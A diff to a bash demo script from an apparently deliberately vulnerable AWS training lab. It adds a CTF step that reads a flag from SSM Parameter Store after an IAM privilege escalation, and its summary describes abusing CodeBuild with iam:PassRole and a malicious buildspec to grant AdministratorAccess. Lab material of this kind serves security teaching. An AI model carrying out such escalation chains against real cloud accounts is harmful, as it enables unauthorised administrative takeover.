@@ -276,7 +276,25 @@ else
 fi
 echo ""
 
-# Summary
+# [EXPLOIT] Step 10: Capture the CTF flag from SSM Parameter Store
+echo -e "${YELLOW}Step 10: Capturing CTF flag from SSM Parameter Store${NC}"
+use_starting_creds
+FLAG_PARAMETER_NAME="/pathfinding-labs/flags/codebuild-001-to-admin"
+echo "Starting user now has AdministratorAccess — reading flag from SSM: $FLAG_PARAMETER_NAME"
+show_attack_cmd "Attacker" "aws ssm get-parameter --region $AWS_REGION --name \"$FLAG_PARAMETER_NAME\" --query 'Parameter.Value' --output text"
+CTF_FLAG=$(aws ssm get-parameter \
+    --region $AWS_REGION \
+    --name "$FLAG_PARAMETER_NAME" \
+    --query 'Parameter.Value' \
+    --output text 2>/dev/null)
+
+if [ -n "$CTF_FLAG" ] && [ "$CTF_FLAG" != "None" ]; then
+    echo -e "${GREEN}✓ CTF Flag: $CTF_FLAG${NC}"
+else
+    echo -e "${YELLOW}Note: Could not retrieve CTF flag (may not be configured)${NC}"
+fi
+echo ""
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
@@ -290,12 +308,14 @@ echo "3. Passed privileged role: $TARGET_ROLE to CodeBuild project"
 echo "4. Started build execution with malicious buildspec"
 echo "5. Buildspec attached AdministratorAccess policy to $STARTING_USER"
 echo "6. Achieved: Administrator Access"
+echo "7. Captured CTF flag from SSM Parameter Store: $CTF_FLAG"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (codebuild:CreateProject + iam:PassRole)"
 echo -e "  → CodeBuild project with $TARGET_ROLE"
 echo -e "  → (codebuild:StartBuild) → Buildspec executes with admin permissions"
 echo -e "  → Attach AdministratorAccess to $STARTING_USER → Admin"
+echo -e "  → ssm:GetParameter → /pathfinding-labs/flags/codebuild-001-to-admin (CTF flag)"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
